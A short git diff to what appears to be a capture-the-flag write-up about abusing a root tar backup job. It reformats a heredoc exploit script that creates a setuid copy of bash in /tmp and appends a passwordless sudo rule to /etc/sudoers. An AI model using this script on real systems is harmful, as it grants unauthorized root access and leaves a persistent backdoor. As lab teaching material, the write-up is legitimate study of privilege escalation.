@@ -224,11 +224,11 @@ we can clearly see that the shell is using the tar command to backup the files p
 ```bash
 #first create a malicious script 
 cat > exploit.sh << 'EOF'
-> #!/bin/bash
-> cp /bin/bash /tmp/rootbash
-> chmod 4755 /tmp/rootbash
-> echo "server-management ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
-> EOF
+ #!/bin/bash
+ cp /bin/bash /tmp/rootbash
+ chmod 4755 /tmp/rootbash
+ echo "server-management ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
+ EOF
 ```
 ```bash
 #now give make the script executable
